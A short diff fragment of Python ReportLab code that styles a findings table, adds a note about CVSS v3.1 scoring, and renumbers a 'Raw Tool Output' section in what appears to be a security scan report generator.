+            ('TEXTCOLOR',(0,0),(-1,0),colors.white),
+            ('ROWBACKGROUNDS',(0,1),(-1,-1),[colors.white,colors.HexColor('#f6f8fa')]),
+            ('GRID',(0,0),(-1,-1),0.3,colors.HexColor('#e1e4e8')),
+            ('TOPPADDING',(0,0),(-1,-1),3),('BOTTOMPADDING',(0,0),(-1,-1),3),
+            ('VALIGN',(0,0),(-1,-1),'TOP'),
+        ]))
+        story += [t_t, Spacer(1,0.2*cm),
+                  Paragraph("Confirmed findings carry an explicit CVSS v3.1 vector; values come from the "
+                            "computed vector or from NVD for CVE-sourced findings.", META)]
+        story.append(PageBreak())
+
     # ── RAW TOOL OUTPUT ───────────────────────────────────────────────────
     story += [
-        Paragraph("6. Raw Tool Output", H2),
+        Paragraph("7. Raw Tool Output", H2),
         HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
     ]
     for stage in CHAIN:
